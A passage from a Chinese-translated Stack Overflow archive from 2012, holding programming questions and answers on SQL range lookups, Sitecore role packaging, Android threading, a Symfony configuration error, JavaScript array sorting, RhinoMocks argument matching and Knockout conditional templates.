    union all select 401303, null from dual
    union all select 421001, 421005 from dual
    union all select 421201, null from dual
    union all select 421202, null from dual
    union all select 421203, null from dual
    union all select 421204, null from dual
    union all select 421301, null from dual
    union all select 421304, null from dual
    union all select 421306, null from dual
)
select st.id, st.data
from some_table st
join tmp_tab tt on st.id between tt.range_from
    and nvl(tt.range_to, tt.range_from); 
```

因此，您可以根据 Excel 数据构建一个公用表表达式，其中包含 range-from 和 range-to；如果您只有一个数字，则可以将 range-to 保留为 null 并`nvl`稍后使用以使其成为虚拟范围；然后在您的表中查找任何范围内的数据。

棘手的一点是生成 CTE，但即使从您拥有的数据手动执行此操作也比手动将每个范围扩展到所有单独的值更容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:50:48.273

我认为使用 IN 是不可能的，但您可以将数据插入到临时表或表变量中：

```
DECLARE @table TABLE (value int)
INSERT INTO @table VALUES (400001),(400002),(400003),(400004),(400005),(400006),(400007),(400008),(400009),(400010),(400011),(400012),(400013),(400014),(400015),(400016),(400017),(400018),(400019),(400020),(400021),(400022),(400023),(400024),(400025),(400026),(400027),(400028),(400029),(400030),(400031),(400032),(400033),(400034),(400035),(400036),(400037),(400038),(400039),(400040),(400041),(400042),(400043),(400044),(400045),(400046),(400047),(400048),(400049),(400050),(400051),(400052),(400053),(400054),(400055),(400056),(400057),(400058),(400059),(400060),(400061),(400062),(400063),(400064),(400065),(400066),(400067),(400068),(400069),(400070),(400071),(400072),(400073),(400074),(400075),(400076),(400077),(400078),(400079),(400080),(00081),(400082),(400083),(400084),(400085),(400086),(400087),(400088),(400089),(400090),(400091),(400092),(400093),(400094),(400095),(400096),(400097),(400098),(400099),(400100),(400101),(400102),(400103),(400104),(400601),(400602),(400603),(400604),(400605),(400606),(400607),(400608),(400609),(400610),(400611),(400612),(400613),(400614),(400701),(400702),(400703),(400704),(400705),(400706),(400707),(400708),(400709),(400710),(401101),(401104),(401105),(401107),(401201),(401202),(401203),(401207),(401209),(401301),(401303),(421001),(421002),(421003),(421004),(421005),(421201),(421202),(421203),(421204),(421301),(421304),(421306)

DECLARE @minValue INT
SET @minValue = (SELECT MIN (value) FROM @table)

DECLARE @valueToTest INT
SET @valueToTest = 200

PRINT CASE WHEN @valueToTest < @minValue THEN 'below range'
           ELSE 'NOT below range'
      END 
```

# sitecore - 角色/权限逐项列出？

> ID：11553980
> 
> 赞同：9
> 
> 时间：2012-07-19T04:31:04.733
> 
> 标签：sitecore

我一直在寻找一段时间，并且已经手动完成了许多角色和权限的部署，但是有没有办法在 Sitecore 中为角色/权限创建一个包（或等效的包）？

当您无法从一个环境到下一个环境进行完全部署时，手动部署具有权限的新角色是一项非常乏味的工作。

只是好奇是否有人设法做到这一点或有办法让这更容易？

干杯

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-19T07:43:29.537

可以将用户和角色添加到包中。在包设计器中，“添加”功能区中有一个“安全帐户”按钮，可让您将用户/角色添加到包中。

至于权限，它们存储在设置它们的项目中。因此，要部署权限，您应该将项目添加到包中。

# android - Android 开发 - Thread 和 Handler 一起发布

> ID：11553982
> 
> 赞同：0
> 
> 时间：2012-07-19T04:31:13.767
> 
> 标签：android, multithreading, handler, handle

所以我要做的基本上是当/当用户在 EditText 中输入时，我基本上想搜索以 EditText 内的任何内容开头的所有单词（通过执行 editText.getText().toString( ））。我在 EditText 中添加了一个 TextChangedListener，每当用户键入任何字符时，它都会调用名为“addResults”的方法，该方法使用以下代码：

```
public void addResults(final String prefix){
    if(thread != null){
        try{
        thread.wait();
        thread.interrupt();
        thread.suspend();
        thread.destroy();
        thread.stop();
        thread = null;
        }catch(Exception e){

        }
    }
    results.clear();
    resultsArray = null;
    this.prefix = prefix;
    thread = new Thread(
            new Runnable(){
                public void run(){
                    try{
                        URL url = new URL(String.format(WORD_URL, prefix));
                        URLConnection connection = url.openConnection();
                        connection.setReadTimeout(Timeout.TIMEOUT);
                        connection.setConnectTimeout(Timeout.TIMEOUT);
                        InputStream is = connection.getInputStream();
                        Scanner reader = new Scanner(is);
                        while(reader.hasNextLine()){
                            String line = reader.nextLine();
                            if(line != null){
                                if(line.contains(String.format(CHECKER, prefix))){
                                    String[] s = line.split(String.format(CHECKER, prefix));
                                    String[] s2 = s[1].split(INIT_SPLIT);
                                    if(s2.length > 0){
                                        for(int i = 1; i < s2.length; i++){
                                            String l = s2[i];
                                            String[] split = l.split(SECOND_SPLIT);
                                            results.add(new Result(prefix, split[0].trim()));
                                        }
                                    }
                                    break;
                                }
                            }
                        }
                        resultsArray = WordSearcher.toArray(results);
                        handler.sendMessage(handler.obtainMessage());
                        reader.close();
                    }catch(Exception e){
                        e.printStackTrace();
                    }
                }
            }
    );
    thread.start();
} 
```

而且该方法没有任何问题，它确实得到了正确的单词和所有内容，但问题是如果用户在尝试获取单词时键入，它似乎没有更新（仍然显示旧搜索的结果）。在我的处理程序中，我基本上只是将我的 ListView 的适配器设置为从该方法生成的字符串数组（resultsArray）。我能想到的一些可能的解决方案是立即停止线程的执行，或者如果用户在线程运行时键入，则找到一种方法使其取消先前的请求，并使其处理 EditText 中的当前文本。任何其他解决方案将不胜感激。谢谢。

注意：如果线程在用户键入之前完成执行，则它可以正常工作。只有当线程仍在执行并且用户开始键入时，它才会成为问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:58:10.613

可能，您的代码`try`不像您期望的那样工作。我相信，它实际上并没有停止以前的线程（请参阅**不推荐使用**的方法文档[suspend()](http://developer.android.com/reference/java/lang/Thread.html#suspend%28%29)，[destroy()](http://developer.android.com/reference/java/lang/Thread.html#destroy%28%29)，[stop()](http://developer.android.com/reference/java/lang/Thread.html#stop%28java.lang.Throwable%29)）。看起来您可能有多个同时运行的线程并且只接收一条消息。我建议在 while 循环中检查你的可运行对象中的[isInterrupted()](http://developer.android.com/reference/java/lang/Thread.html#isInterrupted%28%29)（如 Thread.currentThread().isInterrupted()），如果线程被中断，则不要发送消息。

# symfony - Symfony 2 - 配置路径“security.access_control”不能被覆盖

> ID：11553983
> 
> 赞同：1
> 
> 时间：2012-07-19T04:31:17.120
> 
> 标签：symfony, amazon-ec2, amazon-elastic-beanstalk

任何想法是什么导致了这个错误？在我的本地 MAMP 环境中，我没有任何问题，一旦推送到 Ec2 实例，它就会开始出现。

```
ForbiddenOverwriteException: Configuration path "security.access_control" cannot be overwritten. You have to define all options for this path, and any of its sub-paths in one configuration section.
in /var/www/html/vendor/symfony/src/Symfony/Component/Config/Definition/BaseNode.php line 156
at BaseNode->merge() in /var/www/html/vendor/symfony/src/Symfony/Component/Config/Definition/ArrayNode.php line 347
at ArrayNode->mergeValues() in /var/www/html/vendor/symfony/src/Symfony/Component/Config/Definition/BaseNode.php line 167
at BaseNode->merge() in /var/www/html/vendor/symfony/src/Symfony/Component/Config/Definition/Processor.php line 36
at Processor->process() in /var/www/html/vendor/symfony/src/Symfony/Component/Config/Definition/Processor.php line 52
at Processor->processConfiguration() in /var/www/html/vendor/symfony/src/Symfony/Component/HttpKernel/DependencyInjection/Extension.php line 101
at Extension->processConfiguration() in /var/www/html/vendor/symfony/src/Symfony/Bundle/SecurityBundle/DependencyInjection/SecurityExtension.php line 53
at SecurityExtension->load() in /var/www/html/vendor/symfony/src/Symfony/Component/DependencyInjection/Compiler/MergeExtensionConfigurationPass.php line 42
at MergeExtensionConfigurationPass->process() in /var/www/html/vendor/symfony/src/Symfony/Component/HttpKernel/DependencyInjection/MergeExtensionConfigurationPass.php line 39
at MergeExtensionConfigurationPass->process() in /var/www/html/vendor/symfony/src/Symfony/Component/DependencyInjection/Compiler/Compiler.php line 119
at Compiler->compile() in /var/www/html/vendor/symfony/src/Symfony/Component/DependencyInjection/ContainerBuilder.php line 437
at ContainerBuilder->compile() in /var/www/html/app/bootstrap.php.cache line 872
at Kernel->buildContainer() in /var/www/html/app/bootstrap.php.cache line 783
at Kernel->initializeContainer() in /var/www/html/app/bootstrap.php.cache line 517
at Kernel->boot() in /var/www/html/app/bootstrap.php.cache line 548
at Kernel->handle() in /var/www/html/web/app.php line 17 
```

# javascript - 原型回调函数替换 'this' 值

> ID：11553985
> 
> 赞同：1
> 
> 时间：2012-07-19T04:31:35.107
> 
> 标签：javascript, prototypejs, this

好吧，我偷偷怀疑我忽略了一些非常简单的东西，但是我遇到了以下代码的问题：

```
Array.prototype.sortArr = function (skey)
{
    var vals = new Array();
    for (key in this)
    {
        if (typeof(this[key][skey]) != 'undefined')
        {
            vals.push((this[key][skey]+'').toLowerCase());
        }
    }
    vals.sort();

    var newArr = new Array();
    for (i=0;i<vals.length;i++)
    {
        for (key in this)
        {
            if (typeof(this[key][skey]) != 'undefined')
            {
                if ((this[key][skey]+'').toLowerCase() == vals[i])
                {
                    newArr.push(this[key]);
                    break;
                }
            }
        }
    }
    return newArr;
} 
```

好的，简而言之，这个函数类似于 sort 函数，不同之处在于它通过多级对象进行排序，并且我指定了它需要排序的键。
问题是我从未真正替换或更改“this”值，这意味着这个函数实际上并没有做任何事情。例如：

```
var arr = new Array(new Array(1,5),new Array(2,0));
arr.sortArr(1); 
```

它不会改变通话`arr`之前或之后的情况`sortArr(1)`。但是，当我`alert(newArr)`在函数返回之前放置一个权利时，它表明它实际上确实重新排序了。所以，我的问题是；如何替换`this`回调函数中的值或至少返回正确/新数组？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:42:28.607

要在方法结束时修改当前数组，您需要像这样分配给它的元素，在函数结束之前将所有元素复制到当前对象的数组中：

```
this.length = newArr.length;
for (var i = 0; i < newArr.length; i++) {
    this[i] = newArr[i];
} 
```

你也可以`.splice()`这样使用：

```
newArr.unshift(this.length);     // how many items to remove for .splice()
newArr.unshift(0);               // index for .splice() operation
this.splice.apply(this, newArr); // add the newArr elements 
```

仅供参考，在数组上使用该构造通常是不正确的，`for/in`因为除了数组元素之外，它还会迭代对象上的属性，这通常会使您感到困惑。如果您想迭代数组中的项目，请使用传统的 for 循环，就像我在上面的代码片段中所做的那样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:48:46.637

当您实现它时，您将返回一个新数组。如果您想用新结果替换原始数组，则必须明确这样做：

```
var arr = new Array(new Array(1,5),new Array(2,0)); 
arr = arr.sortArr(1); 
```

但听起来那不是你想要做的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T05:27:18.887

```
var newArray = [{},"Bob",32].sortArr(); 
```

想想你的 return 语句不是回到函数的顶部............把它想象成离开左侧。

所以当你定义你的函数时，你把你的参数放在你的参数的位置。如果要按原样对传入的对象进行排序，则需要按原样对原始对象执行操作，而不保存对象的副本。

我的意思是：

```
function addBob (obj) {
    obj.name = "Bob";
    return undefined;
    // any fn without a return mentioned returns undefined, anyway.
    // I just put this here for reference.
} 
```

此版本的 addBob 将 name : "Bob" 添加到原始对象。

```
function addBob2 (obj) {
    bobject = obj;
    bobject.name = "Bob";
    return undefined;  // again, if you don't state a return, that's what you get
} 
```

好的。现在我们遇到了问题。你能看见它吗？

您已将一个对象放入函数的顶部，并保存了对象的本地副本（有时，这是一件好事……但不是在这里）。

然后你修改了你的副本。

你认为你已经完成了。但你不是。没有改变。为什么？

因为您没有将更改保存回原始文件。可能有两种方法可以做到这一点：

1.  函数 addBob3(obj) { var localObj = obj; localObj.name = "鲍勃"; 对象 = 本地对象；}

    addBob3(externalObj);

此函数旨在保存本地副本以进行计算，但是一旦这些计算完成，它就会覆盖原始对象或对象的属性——即：

```
obj.name = localObj.name; 
```

这会将数据发送回原始对象（即：在函数顶部之外）。有些人认为这是不好的做法，因为如果您有几十个这样的就地修改函数，当您进入 10,000 行程序时，很难分辨哪些对象已被哪些函数修改。

现在不要太担心。

另***一种***方法：

```
function addBob4(obj) {
    var localObj = obj;
    localObj.name = "Bob";
    return localObj;
}

var externalObj = { property1 : "something" },

newObj = addBob4(externalObj); 
```

现在，您已经将返回值传到了函数调用的***LEFT***。newObj 将是一个与 externalObj 完全相同的对象，除了您对副本所做的新添加。

因此，如果您在变量中捕获返回，函数可以从左侧退出。如果您直接就地修改传入的对象，则在函数退出后，这些编辑将应用于原始对象/对象。

使用“this”有点棘手。如果它是一个对象，你可以做“this.name = 'Bob';” 你就完成了。

对于您的数组，您需要第三个循环，基本上清空 this[0] - this[this.length - 1]，然后填充 this[0] - this[newArr.length - 1]，使用来自 newArr 的值。因为 JavaScript 不会让您分解“this”并将其变成“this = X”语句。

# c# - 为什么在 RhinoMocks 3.6 中使用 StringDictionary 时得到“预期 #0，实际 #1”

> ID：11553993
> 
> 赞同：1
> 
> 时间：2012-07-19T04:32:40.963
> 
> 标签：c#, unit-testing, rhino-mocks

今天我改为在我的代码中使用`StringDictionary`而不是`Dictionary<string,string>`，但是旧的单元测试失败了。所以我写了一个小单元测试来测试这个。

这是我的小测试：

```
using Rhino.Mocks;
using NUnit.Framework;
//using CustomDictionary = System.Collections.Specialized.StringDictionary;
using CustomDictionary = System.Collections.Generic.Dictionary<string, string>;

namespace ConsoleApplication1
{
    public interface ITest
    {
        void DoSth(CustomDictionary dic);
    }
    public class OneTest : ITest
    {
        public void DoSth(CustomDictionary dic) {/*do nothing*/}
    }

    [TestFixture]
    public class TestClass
    {
        [Test]
        public void Test1()
        {
            var mockRepository = new MockRepository();
            var test = mockRepository.StrictMock<ITest>();

            using (mockRepository.Record())
            {
                Expect.Call(() => test.DoSth(new CustomDictionary { { "Test", "Test1" } }));
            }
            test.DoSth(new CustomDictionary { { "Test", "Test1" } });

            mockRepository.VerifyAll();
        }
    }
} 
```

如果我使用`Dictionary<string,string>`，测试将通过，但是当我使用 时`StringDictionary`，测试失败。

这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T07:06:02.260

问题来自`StringDictionary`实例比较。没有被覆盖的`Equals`方法，因此实例比较的不是内容，而是引用。如果您将使用相同的实例，测试将通过：

```
 [Test]
    public void Test1()
    {
        var mockRepository = new MockRepository();
        var test = mockRepository.StrictMock<ITest>();
        var dictionary = new CustomDictionary { { "Test", "Test1" } };

        using (mockRepository.Record())            
            Expect.Call(() => test.DoSth(dictionary));

        test.DoSth(dictionary);
        mockRepository.VerifyAll();
    } 
```

您可以覆盖`Equals`您的`CustomDictionary`课程以使您的原始测试通过：

```
public override bool Equals(object obj)
{
    CustomDictionary other = obj as CustomDictionary;
    if (other == null)
        return false;

    if (Count != other.Count)
        return false;

    foreach (string key in Keys)
    {
        if (!other.ContainsKey(key))
            return false;

        if (this[key] != other[key])
            return false;
    }

    foreach (string key in other.Keys)
    {
        if (!ContainsKey(key))
            return false;
    }

    return true;
} 
```

顺便说一句，我希望这不是您真正的测试，因为在这里您正在测试模拟，而不是测试您的代码。

为什么您的代码适用于字典：

据我了解 RhinoMocks 实现，`Rhino.Mocks.Impl.Validate`用于参数验证的类。你可以看看它的`ArgsEqual`方法实现：

```
public static bool ArgsEqual(object[] expectedArgs, object[] actualArgs)
{
    return RecursiveCollectionEqual(expectedArgs, actualArgs);
} 
```

我把细节留给你`RecursiveCollectionEqual`，但有趣的部分是参数比较：

```
if (current == null)
{
    if (actual != null)
        return false;
}
else if (!SafeEquals(current, actual))
{
    if (current is ICollection)
    {
        if (!RecursiveCollectionEqual((ICollection)current, (ICollection)actual))
            return false;

        continue;
    }
    return false;
} 
```

如您所见，如果参数是，`ICollection`则 Rhino 会更深入地比较预期和实际集合。`Dictionary`实现`ICollection`，但`StringDictionary`没有。因此，`StringDictionary`类型的参数仅通过引用进行比较。

更新：没有注意到，你有一个别名。只需从 type 继承，您就可以覆盖`Equals`：

```
public class CustomDictionary : StringDictionary 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T06:25:44.917

我不知道这是否有帮助，但两者之间的主要区别在于 StringDictionairy 会自动将所有键小写（测试变为测试）。也许这就是测试失败的原因？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T10:14:59.697

问题是 Rhino Mocks 在检查 Expect.Call() 中传递的参数是否与实际传递的参数匹配时**通过引用进行比较。**
您的代码中的问题是您创建了 2 个**不同**的自定义字典对象，一个用于期望，一个用于实际调用，因此它们不匹配：

```
 using (mockRepository.Record())
        {
            Expect.Call(() => test.DoSth(new CustomDictionary { { "Test", "Test1" } }));
        }
        test.DoSth(new CustomDictionary { { "Test", "Test1" } }); 
```

它可以很容易地修复如下（也消除了重复）：

```
 var myDictionary = new CustomDictionary { { "Test", "Test1" } }));
        using (mockRepository.Record())
        {
            Expect.Call(() => test.DoSth(myDictionary);
        }
        test.DoSth(myDictionary ); 
```

# javascript - 如何在数据绑定视图中模板化 If-Else 结构？

> ID：11553999
> 
> 赞同：95
> 
> 时间：2012-07-19T04:33:32.187
> 
> 标签：javascript, knockout.js

我经常发现自己在基于 KO 的 HTML 模板中使用这个成语：

```
<!-- ko if: isEdit -->
<td><input type="text" name="email" data-bind="value: email" /></td>
<!-- /ko -->
<!-- ko ifnot: isEdit -->
<td data-bind="text: email"></td>
<!-- /ko --> 
```

在 KO 中是否有更好/更清洁的方法来执行条件，或者是否有比仅使用传统 if-else 构造更好的*方法？*

另外，我想指出某些版本的 Internet Explorer (IE 8/9) 不能正确解析上述示例。请参阅[此 SO 问题](https://stackoverflow.com/questions/12613668/knockout-virtual-elements-between-tr-tags-in-ie-browsers)以获取更多信息。快速总结是，不要在表格标签内使用注释（虚拟绑定）来支持 IE。改用`tbody`：

```
<tbody data-bind="if: display"><tr><td>hello</td></tr></tbody> 
```

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-07-19T05:09:22.663

有几种不同的方法可以处理这种类型的代码。

*   像现在这样使用 if/ifnot 组合。这工作正常并且不是非常冗长。

*   Michael Best 的 switch/case 绑定 ( [https://github.com/mbest/knockout-switch-case](https://github.com/mbest/knockout-switch-case) ) 非常灵活，可以让您轻松处理这个和更复杂的那些（比 true/false 更多的状态）。

*   另一种选择是使用动态模板。您可以将一个区域绑定到一个或多个模板，并使用基于 observable 的模板名称。这是我不久前就这个主题写的一篇文章：[http](http://www.knockmeout.net/2011/03/quick-tip-dynamically-changing.html) ://www.knockmeout.net/2011/03/quick-tip-dynamically-chang.html 。在您的场景中，它可能如下所示：

```
<td data-bind="template: $root.getCellTemplate"></td>

<script id="cellEditTmpl" type="text/html">
    <input type="text" name="email" data-bind="value: email" />
</script>

<script id="cellTmpl" type="text/html">
    <span data-bind="text: email"></span>
</script> 
```

该`getCellTemplate`函数可以存在于任何地方，但将给定项目 ($data) 作为第一个参数，并返回要使用的模板的名称。

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2012-07-19T05:07:18.477

一种方法是使用命名模板（可以支持传递参数）：

```
<!-- ko template: isEdit() ? 'emailEdit' : 'emailDisplay' --><!-- /ko -->
<script id="emailEdit" type="text/html">
    <td><input type="text" name="email" data-bind="value: email" /></td>
</script>
<script id="emailDisplay" type="text/html">
    <td data-bind="text: email"></td>
</script> 
```

另一种选择是使用我的[switch/case 插件](https://github.com/mbest/knockout-switch-case)，它的工作方式如下：

```
<!-- ko switch -->
    <!-- ko case: isEdit -->
        <td><input type="text" name="email" data-bind="value: email" /></td>
    <!-- /ko -->
    <!-- ko case: $else -->
        <td data-bind="text: email"></td>
    <!-- /ko -->
<!-- /ko --> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-08-12T14:36:15.620

为了避免在使用 if: / ifnot: 组合时重新计算敲除绑定，您可以将它们与 'with:' 构造结合使用

```
 <!-- ko with: $data.DoSomePerformanceCriticalWork($data.SomeParameter()) -->
        <!-- ko if: $data.Condition() -->
           ... some markup ...
        <!-- /ko -->
        <!-- ko ifnot: $data.Condition() -->
           ... some markup ...
        <!-- /ko -->
    <!-- /ko --> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-10-13T04:18:28.063

现在还有[`knockout-else`](https://github.com/brianmhunt/knockout-else)绑定/插件（我写来解决这个问题）。